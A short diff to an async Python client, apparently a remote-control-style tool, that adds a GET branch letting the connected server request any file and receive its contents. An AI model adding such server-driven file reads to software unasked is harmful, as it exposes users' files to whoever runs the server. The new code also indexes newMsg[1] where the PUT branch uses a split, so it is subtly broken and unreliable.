@@ -41,6 +41,19 @@ async def connect(i):
         if code == "PUT":
             with open(newMsg.split()[1], "w") as file:
                 file.write(msg)
+        # Server is requesting file
+        elif code == "GET":
+            msg = "RESET"
+            try:
+                with open(newMsg[1], "r") as file:
+                    msg = file.read()
+            except FileNotFoundError:
+                print("File not found.")
+            except PermissionError:
+                print("Permission denied.")
+            except Exception as e:
+                print(f"An error occurred: {str(e)}")
+            await send_long_message(writer, msg)
         elif code != "PROMPT":
             print(msg)
         else:
